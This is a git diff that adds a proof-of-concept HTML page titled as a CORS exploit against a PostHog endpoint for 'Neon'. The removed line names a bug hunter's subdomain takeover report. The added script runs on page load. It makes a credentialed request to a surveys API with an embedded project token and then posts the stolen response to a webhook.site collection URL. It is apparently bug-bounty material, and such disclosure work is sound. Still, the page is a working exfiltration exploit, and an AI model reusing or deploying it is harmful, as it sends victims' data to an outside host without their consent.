@@ -1,2 +1,38 @@
- Subdomain takeover by bug hunter fazil78655 h1
 
+
+<!DOCTYPE html>
+<html>
+<head>
+  <title>CORS Exploit PoC - Neon PostHog</title>
+</head>
+<body>
+  <h2>Exfiltrated Survey Data:</h2>
+  <pre id="output">Waiting...</pre>
+
+  <script>
+    async function steal() {
+      try {
+        let response = await fetch("https://us.i.posthog.com/api/surveys/?token=phc_yv8ksk9v2FajpXIxVHYj4g59LVeLyo8yN5SaTG1JJty&ip=0&ver=1.249.5", {
+          method: "GET",
+          credentials: "include"
+        });
+
+        let text = await response.text();
+
+        // Show data on page
+        document.getElementById("output").textContent = text;
+
+        // Also send to your webhook
+        await fetch("https://webhook.site/1b41bc5c-4ca7-435a-b8be-7e42ded1d4f8", {
+          method: "POST",
+          body: text
+        });
+      } catch (e) {
+        document.getElementById("output").textContent = "Error: " + e;
+      }
+    }
+
+    steal();
+  </script>
+</body>
+</html>
